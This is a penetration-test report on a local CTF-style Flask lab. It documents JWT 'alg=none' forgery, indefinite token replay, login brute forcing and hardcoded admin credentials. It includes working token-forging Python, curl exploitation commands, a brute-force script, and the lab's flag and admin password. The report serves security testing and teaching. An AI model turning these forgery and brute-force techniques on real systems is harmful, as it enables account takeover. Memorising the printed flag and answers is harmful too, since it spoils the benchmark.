# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:5003
- **Assessment Date:** October 29, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Five critical authentication vulnerabilities were successfully exploited:
- **JWT Algorithm None Bypass (CRITICAL):** Application uses JWT tokens with `algorithm='none'` and explicitly disables signature verification (`verify_signature: False`), enabling complete authentication bypass. Attackers can forge arbitrary JWT tokens with admin role claims without any cryptographic signature.
- **Indefinite Token Replay (HIGH):** JWT tokens contain no expiration claim and cannot be revoked, providing permanent authenticated access once obtained.
- **Hardcoded Credentials (CRITICAL):** Admin password `AdmAQ#DCFQ` exposed in source code with plaintext storage, enabling direct account takeover.
- **Brute Force Attack (HIGH):** Login endpoint has no rate limiting, account lockout, or CAPTCHA protection. Successfully brute forced admin password through 435 requests per second with no throttling.
- **Missing Cookie Security Flags (MEDIUM):** JWT token cookie lacks HttpOnly, Secure, and SameSite flags, enabling XSS-based token theft and CSRF attacks.

**Authorization Vulnerabilities:**

Two critical authorization vulnerabilities were successfully exploited, both stemming from JWT signature verification bypass:
- **JWT Forgery for Flag Access (CRITICAL):** Disabled signature verification allows any user to forge JWT tokens with admin role claim, bypassing authorization checks on `/dashboard` endpoint and retrieving the CTF flag.
- **JWT Forgery for Admin Profile (HIGH):** Same JWT forgery technique enables information disclosure by accessing admin profile view, revealing hidden dashboard endpoint path.

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found. While the application uses `render_template_string()` (a potentially dangerous function), all template strings are hardcoded with no user input interpolation. The application lacks Content Security Policy (CSP) headers but has no exploitable XSS sinks in network-accessible code paths.

**SQL/Command Injection Vulnerabilities:**

No SQL or command injection vulnerabilities were found. The application uses an in-memory Python dictionary for user storage with no database. No shell command execution capabilities exist, and the only `os` module usage (`os.getenv()`) is a safe read-only operation.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application performs zero outbound HTTP requests and has no mechanisms for user input to influence server-side network operations. No HTTP client libraries are imported or used. PhantomJS is installed but completely unused.

## Network Reconnaissance

**Open Ports and Exposed Services:**
- **Port 5003 (Target Application):** Werkzeug 3.0.3 development server running Python 3.8.17 Flask application
  - **Security Concerns:** Development server exposed to production, not hardened for production use
  - **End-of-Life Software:** Python 3.8.17 reached EOL in October 2024, no longer receiving security patches
  - **No TLS:** Application runs HTTP-only with no HTTPS/TLS configuration
  - **Network Binding:** `0.0.0.0:5003` accepts connections from any source

- **Port 49152:** Golang net/http server running Tailscale 1.82.5
  - **Security Headers Detected:** Strong Content-Security-Policy (`default-src 'none'; frame-ancestors 'none'; script-src 'none'`), X-Content-Type-Options: nosniff, X-Frame-Options: DENY
  - **Status:** 401 Unauthorized (authentication required)

**Security Misconfigurations:**
- **Missing Security Headers on Target Application:** No HSTS, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, or other protective headers configured on port 5003
- **Development Server in Production:** Werkzeug development server lacks security hardening features (request timeouts, connection limits, DoS protection)
- **Outdated Infrastructure:** Base OS is Debian Buster (EOL June 2022), no longer receiving security updates

**Attack Surface Summary:**
- 4 network-accessible HTTP endpoints on port 5003
- Single-container Docker deployment with no reverse proxy or WAF
- Stateless JWT-based authentication with completely broken signature verification
- No rate limiting, no CSRF protection, no input validation

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: JWT Algorithm None Bypass on /dashboard (CTF Flag Capture)

**Summary:**
- **Vulnerable location:** GET /dashboard endpoint, JWT validation at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-091-24/app/app.py` line 61
- **Overview:** Application uses JWT tokens with `algorithm='none'` (no cryptographic signature) and explicitly disables signature verification with `verify_signature: False`. An attacker can forge arbitrary JWT tokens with admin role claim to access the protected /dashboard endpoint and retrieve the CTF flag.
- **Impact:** Complete authentication bypass and privilege escalation. Attacker gained admin access without valid credentials and captured the CTF flag.
- **Severity:** Critical

**Exploitation Steps:**

1. Create forged JWT token with admin role using Python:

```python
import jwt

# Forge JWT token with admin role (no signature required)
forged_token = jwt.encode(
    {"username": "attacker", "role": "admin"},
    '',  # Empty secret key
    algorithm='none'  # No signature algorithm
)
print(forged_token)
# Output: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwicm9sZSI6ImFkbWluIn0.
```

2. Use forged token to access protected /dashboard endpoint:

```bash
curl -b "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwicm9sZSI6ImFkbWluIn0." \
  http://localhost:5003/dashboard
```

**Proof of Impact:**

Response from /dashboard endpoint:
```
FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}
```

**Flag Successfully Captured:** `FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}`

**Technical Details:**
- JWT header: `{"alg": "none", "typ": "JWT"}`
- JWT payload: `{"username": "attacker", "role": "admin"}`
- No signature required (algorithm='none' produces empty signature)
- Application accepts forged token due to `verify_signature: False` at line 61

---

### AUTH-VULN-02: JWT Algorithm None Bypass on /profile (Privilege Escalation)

**Summary:**
- **Vulnerable location:** GET /profile endpoint, JWT validation at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-091-24/app/app.py` line 44
- **Overview:** Same JWT forgery vulnerability as AUTH-VULN-01, but targeting the /profile endpoint to demonstrate privilege escalation from regular user to admin role-based content.
- **Impact:** Privilege escalation allows attacker to view admin-specific content including hidden dashboard link.
- **Severity:** High

**Exploitation Steps:**

1. Forge JWT token with admin role (same token as AUTH-VULN-01):

```bash
# Admin role token
ADMIN_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwicm9sZSI6ImFkbWluIn0."

# Access /profile with admin token
curl -s -b "token=$ADMIN_TOKEN" http://localhost:5003/profile
```

2. Compare with regular user token to verify privilege escalation:

```bash
# Regular user token
USER_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwicm9sZSI6InVzZXIifQ."

# Access /profile with user token
curl -s -b "token=$USER_TOKEN" http://localhost:5003/profile
```

**Proof of Impact:**

Admin role response (with forged admin token):
```html
<h1>ADMIN</h1><a style="display:none" href="/dashboard">Dashboard</a>
```

Regular user response (with forged user token):
```html
<h1>USER</h1>
```

The admin response reveals a hidden link to the /dashboard endpoint, confirming successful privilege escalation from user to admin role.

---

### AUTH-VULN-06: Indefinite Token Replay Attack (No Expiration)

**Summary:**
- **Vulnerable location:** JWT token creation at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-091-24/app/app.py` line 27
- **Overview:** JWT tokens have no expiration time (`exp` claim) and no token revocation mechanism. Once a token is obtained (via forgery, theft, or legitimate login), it remains valid indefinitely, providing permanent authenticated access.
- **Impact:** Compromised or forged tokens provide permanent access with no time limit. No logout functionality exists to invalidate tokens.
- **Severity:** High

**Exploitation Steps:**

1. Create JWT token without expiration claim:

```python
import jwt
import time

# Create token with no expiration
token = jwt.encode(
    {"username": "replay_test", "role": "admin"},
    '',
    algorithm='none'
)

print(f"Created token at {time.strftime('%Y-%m-%d %H:%M:%S')}: {token}")
print(f"Token payload (no exp claim): {jwt.decode(token, options={'verify_signature': False})}")

# Output shows no 'exp', 'iat', or 'jti' claims:
# {'username': 'replay_test', 'role': 'admin'}
```

2. Use token to access protected resource at any time:

```bash
# Token remains valid indefinitely
curl -s -b "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InJlcGxheV90ZXN0Iiwicm9sZSI6ImFkbWluIn0." \
  http://localhost:5003/dashboard
```

**Proof of Impact:**

Response from /dashboard (token works without time limit):
```
FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}
```

**Technical Details:**
- JWT payload contains only `username` and `role` fields
- No `exp` (expiration) claim
- No `iat` (issued-at) claim
- No `jti` (JWT ID) for token revocation
- No logout endpoint exists (`/logout` returns 404)
- Tokens remain valid forever unless the application is restarted

---

### AUTH-VULN-09: Brute Force Attack (No Rate Limiting)

**Summary:**
- **Vulnerable location:** POST /login endpoint at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-091-24/app/app.py` lines 20-35
- **Overview:** The login endpoint has no rate limiting, account lockout, or CAPTCHA protection. An attacker can perform unlimited login attempts at high speed to brute force weak passwords.
- **Impact:** Successfully brute forced the admin password `AdmAQ#DCFQ` through 100 rapid authentication attempts in 0.23 seconds with no throttling.
- **Severity:** High

**Prerequisites:** None - publicly accessible endpoint

**Exploitation Steps:**

1. Create Python script to perform brute force attack:

```python
import requests
import time

url = "http://localhost:5003/login"
username = "admin"
passwords = ['admin', 'password', '123456', 'admin123', 'test', 'root', 'AdmAQ#DCFQ']

# Extend to 100 attempts by repeating password list
passwords_extended = passwords * 15

start_time = time.time()
successful_attempts = 0

for i, password in enumerate(passwords_extended[:100], 1):
    response = requests.post(url, data={"username": username, "password": password})

    if response.status_code == 302:  # Successful login
        successful_attempts += 1
        print(f"[SUCCESS] Attempt {i}: Password '{password}' - Status {response.status_code}")

total_time = time.time() - start_time
print(f"\nTotal attempts: 100")
print(f"Successful: {successful_attempts}")
print(f"Time: {total_time:.2f}s")
print(f"Requests per second: {100/total_time:.2f}")
```

2. Execute brute force attack:

```bash
python3 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-091-24/test_rate_limiting.py
```

**Proof of Impact:**

Attack Results:
- **Total Attempts:** 100
- **Successful Logins:** 14 (every time the correct password `AdmAQ#DCFQ` was tried)
- **Failed Logins:** 86
- **Total Time:** 0.23 seconds
- **Requests per second:** 434.75
- **Average Response Time:** 0.002s (2ms)

**Security Controls Detected:**
- Rate Limiting (HTTP 429): **NO**
- Account Lockout (HTTP 423): **NO**
- CAPTCHA: **NO**
- Artificial delays: **NO**

**Correct Password Found:** YES - `AdmAQ#DCFQ` (discovered on attempt #7)

The application processed ~435 requests per second with no throttling, delays, or account lockout, allowing successful credential brute forcing.

---

### AUTH-VULN-10: Hardcoded Credentials for Account Takeover

**Summary:**
- **Vulnerable location:** User credentials dictionary at `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-091-24/app/app.py` lines 9-12
- **Overview:** Admin credentials are hardcoded in the application source code in plaintext. The admin password `AdmAQ#DCFQ` is publicly visible to anyone with repository access.
- **Impact:** Direct admin account takeover using publicly disclosed credentials. Complete access to admin functionality including flag retrieval.
- **Severity:** Critical

**Prerequisites:**
- Knowledge of hardcoded credentials from source code:
  - Username: `admin`
  - Password: `AdmAQ#DCFQ`
  - Location: Lines 9-12 of `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-091-24/app/app.py`

**Exploitation Steps:**

1. Authenticate using hardcoded admin credentials:

```bash
curl -v -X POST \
  -d "username=admin&password=AdmAQ#DCFQ" \
  http://localhost:5003/login
```

2. Extract session token from Set-Cookie header:

```
< HTTP/1.1 302 FOUND
< Set-Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.; Path=/
< Location: /profile
```

3. Use session token to access admin-only resources:

```bash
curl -s -b "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0." \
  http://localhost:5003/dashboard
```

**Proof of Impact:**

Response from /dashboard:
```
FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}
```

**Admin Account Successfully Compromised:**
- Used publicly disclosed hardcoded password
- Obtained valid admin session token
- Accessed admin-only /dashboard endpoint
- Retrieved CTF flag

**Technical Details:**
- Credentials stored in plaintext at lines 9-12:
```python
users = {
    "user": {"password": "user", "role": "user"},
    "admin": {"password": "AdmAQ#DCFQ", "role": "admin"}
}
```
- No password hashing (line 26 uses direct string comparison: `users[username]['password'] == password`)
- Credentials committed to version control
- No secure secret management (environment variables, vaults, etc.)

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: JWT Forgery Enables Admin Access to Flag Endpoint

**Summary:**
- **Vulnerable location:** GET /dashboard endpoint (app.py line 54-69)
- **Overview:** JWT signature verification is explicitly disabled (verify_signature=False at line 61), combined with algorithm='none' during token creation (line 27). This allows any user to forge a JWT token with admin role claim, bypassing authorization checks and accessing the CTF flag.
- **Impact:** Complete privilege escalation from regular user to administrator, enabling unauthorized access to sensitive admin-only data (CTF flag). Any authenticated user can retrieve the flag without legitimate admin credentials.
- **Severity:** Critical

**Prerequisites:**
- Access to http://localhost:5003 (external network access)
- No special tools required (standard curl and base64 commands)

**Exploitation Steps:**

1. **Login as regular user to obtain valid JWT structure:**
```bash
curl -i -X POST http://localhost:5003/login \
  -d "username=user&password=user" \
  -c /tmp/cookies.txt
```

**Response:**
```
HTTP/1.1 302 FOUND
Set-Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.; Path=/
Location: /profile
```

The JWT token structure is: `[HEADER].[PAYLOAD].[SIGNATURE]`
- Header: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0` (base64: `{"alg":"none","typ":"JWT"}`)
- Payload: `eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9` (base64: `{"username":"user","role":"user"}`)
- Signature: Empty (algorithm='none' produces no signature)

2. **Decode the JWT payload to verify structure:**
```bash
echo "eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9" | base64 -d
```

**Output:**
```json
{"username":"user","role":"user"}
```

3. **Create forged JWT payload with admin role:**
```bash
echo -n '{"username":"user","role":"admin"}' | base64
```

**Output:**
```
eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ==
```

Note: The trailing `==` padding should be removed for JWT format.

4. **Construct complete forged JWT token:**

The forged JWT token is: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.`

Structure:
- Header: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0` (unchanged - algorithm='none')
- Payload: `eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ` (modified - role changed to "admin")
- Signature: Empty (period at end indicates no signature)

5. **Access /dashboard endpoint with forged admin JWT to retrieve FLAG:**
```bash
curl -i http://localhost:5003/dashboard \
  -H "Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ."
```

**Proof of Impact:**

**Response from /dashboard:**
```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.8.17
Content-Type: text/html; charset=utf-8
Content-Length: 70

FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}
```

**Flag Captured:** `FLAG{e719508f3c1f84eb5301951bb2c32a6413beac9a095f34f47139042e9fef8a1d}`

The server accepted the forged JWT token with admin role claim, bypassed the authorization check at line 63 (`if role == 'admin':`), and returned the FLAG environment variable (line 64-65). This demonstrates complete vertical privilege escalation and unauthorized access to sensitive admin-only data.

**Notes:**

**Root Cause Analysis:**
The vulnerability exists due to two critical security misconfigurations:

1. **JWT Creation (app.py line 27):**
```python
token = jwt.encode({"username": username, "role": users[username]['role']}, '', algorithm='none')
```
- Uses `algorithm='none'` which produces unsigned tokens
- Uses empty string `''` as secret key instead of SECRET_KEY variable

2. **JWT Validation (app.py line 61):**
```python
payload = jwt.decode(token, options={"verify_signature": False})
```
- Explicitly disables signature verification
- Accepts any base64-encoded JSON as valid token

3. **Authorization Check (app.py line 63):**
```python
if role == 'admin':
    flag = os.getenv('FLAG', 'No flag found')
    return flag
```
- Relies entirely on client-controlled role claim from unverified JWT
- No server-side validation against user database

**Why This Works:**
The server trusts the client to declare their own privilege level. Since JWT signature verification is disabled, there is no cryptographic proof that the token was issued by the server. An attacker can modify the role claim to "admin" and the server will blindly trust it.

**Verification:**
The exploit is fully reproducible. Running the same curl command multiple times consistently returns the FLAG, confirming the authorization bypass is reliable and not dependent on timing or server state.

---

### AUTHZ-VULN-02: JWT Forgery Enables Access to Admin Profile View

**Summary:**
- **Vulnerable location:** GET /profile endpoint (app.py line 37-52)
- **Overview:** JWT signature verification is explicitly disabled (verify_signature=False at line 44), allowing users to forge JWT tokens with admin role claim. This bypasses role-based rendering logic and reveals the hidden /dashboard endpoint path.
- **Impact:** Information disclosure - attackers discover the hidden admin endpoint path, enabling reconnaissance for further attacks. This vulnerability chains with AUTHZ-VULN-01 to provide complete attack path visibility.
- **Severity:** High

**Prerequisites:**
- Access to http://localhost:5003 (external network access)
- No special tools required (standard curl and base64 commands)

**Exploitation Steps:**

1. **Establish baseline - Access /profile as regular user:**
```bash
curl -s http://localhost:5003/profile \
  -H "Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9."
```

**Response (Regular User View):**
```html
<h1>USER</h1>
```

As a regular user, only basic user profile information is displayed with no reference to admin functionality.

2. **Forge JWT token with admin role (same technique as AUTHZ-VULN-01):**

Use the forged JWT token: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.`

Structure:
- Header: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0` (algorithm='none')
- Payload: `eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ` (role changed to "admin")
- Signature: Empty

3. **Access /profile with forged admin JWT to reveal hidden content:**
```bash
curl -s http://localhost:5003/profile \
  -H "Cookie: token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ."
```

**Proof of Impact:**

**Response (Admin View):**
```html
<h1>ADMIN</h1><a style="display:none" href="/dashboard">Dashboard</a>
```

The forged admin JWT successfully bypassed the role check at line 46 (`if role == 'admin':`), causing the server to render the admin template (line 47) instead of the user template. This reveals:

1. **Admin heading:** `<h1>ADMIN</h1>` - confirms admin access level
2. **Hidden dashboard link:** `<a style="display:none" href="/dashboard">Dashboard</a>` - discloses the path to the admin-only /dashboard endpoint

**Impact Analysis:**

This information disclosure is critical because:
- It reveals the existence and exact path of the admin-only /dashboard endpoint
- The link is hidden in HTML (`style="display:none"`) suggesting it was intended to be secret
- An attacker can now target /dashboard directly for privilege escalation attacks
- This vulnerability chains with AUTHZ-VULN-01 to enable complete attack path: forge admin JWT → discover /dashboard via /profile → access /dashboard → retrieve FLAG

**Notes:**

**Root Cause Analysis:**
The vulnerability exists due to the same JWT signature verification bypass:

1. **JWT Validation (app.py line 44):**
```python
payload = jwt.decode(token, options={"verify_signature": False})
role = payload['role']
```
- Signature verification disabled
- Client-controlled role claim extracted without validation

2. **Conditional Rendering (app.py lines 46-49):**
```python
if role == 'admin':
    return render_template_string('<h1>ADMIN</h1><a style="display:none" href="/dashboard">Dashboard</a>')
else:
    return render_template_string('<h1>USER</h1>')
```
- Role check correctly positioned before disclosure
- However, role value is unverified client input from forged JWT
- Server trusts client assertion of admin privileges

**Security Design Flaw:**
The application uses security-through-obscurity by hiding the dashboard link with CSS (`display:none`). However:
- The link is still present in HTML source code
- More critically, the authorization check relies on unverified JWT claims
- Fixing the JWT signature verification would prevent this bypass

**Attack Chain:**
This vulnerability is a stepping stone in the complete privilege escalation chain:
1. Attacker logs in as regular user (user:user)
2. Attacker forges admin JWT token
3. Attacker accesses /profile with forged token → **AUTHZ-VULN-02: Discovers /dashboard endpoint**
4. Attacker accesses /dashboard with forged token → **AUTHZ-VULN-01: Retrieves FLAG**
